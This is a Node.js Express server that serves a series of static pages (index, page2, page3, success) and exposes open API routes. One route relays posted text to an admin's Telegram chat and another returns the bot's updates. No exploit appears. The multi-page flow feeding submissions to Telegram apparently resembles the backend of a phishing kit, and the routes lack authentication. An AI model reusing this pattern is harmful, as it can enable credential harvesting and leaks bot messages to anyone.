// ==================== LOAD ENV FIRST ====================
require('dotenv').config();

// ==================== IMPORTS ====================
const express = require('express');
const cors = require('cors');
const path = require('path');
const morgan = require('morgan');
const axios = require('axios');

// ==================== INIT ====================
const app = express();
const PORT = process.env.PORT || 5000;

// ==================== START TELEGRAM BOT SAFELY ====================
try {
    require('./backend/telegram-bot/bot');
    console.log('🤖 Bot started');
} catch (err) {
    console.log('⚠️ Bot not started:', err.message);
}

// ==================== MIDDLEWARE ====================
app.use(cors());
app.use(express.json());
app.use(morgan('dev'));

// ==================== STATIC FILES ====================
app.use(express.static(path.join(__dirname, 'frontend')));

// ==================== API ROUTES ====================

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'OK', message: 'Backend Running' });
});

// Send Telegram message
app.post('/api/send-message', async (req, res) => {
    try {
        const { message } = req.body;

        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.ADMIN_CHAT_ID;

        if (!botToken || !chatId) {
            return res.status(500).json({
                success: false,
                error: 'Missing Telegram config'
            });
        }

        await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            }
        );

        res.json({ success: true });

    } catch (error) {
        console.error(error.message);
        res.status(500).json({ success: false });
    }
});

// Get updates
app.get('/api/get-updates/:offset?', async (req, res) => {
    try {
        const offset = req.params.offset || 0;
        const botToken = process.env.TELEGRAM_BOT_TOKEN;

        const response = await axios.get(
            `https://api.telegram.org/bot${botToken}/getUpdates`,
            { params: { offset, timeout: 30 } }
        );

        res.json({ success: true, data: response.data });

    } catch (error) {
        res.status(500).json({ success: false });
    }
});

// ==================== FRONTEND ROUTES ====================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/index.html'));
});

app.get('/page2', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/page2.html'));
});

app.get('/page3', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/page3.html'));
});

app.get('/success', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/success.html'));
});

// ==================== START SERVER ====================

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
});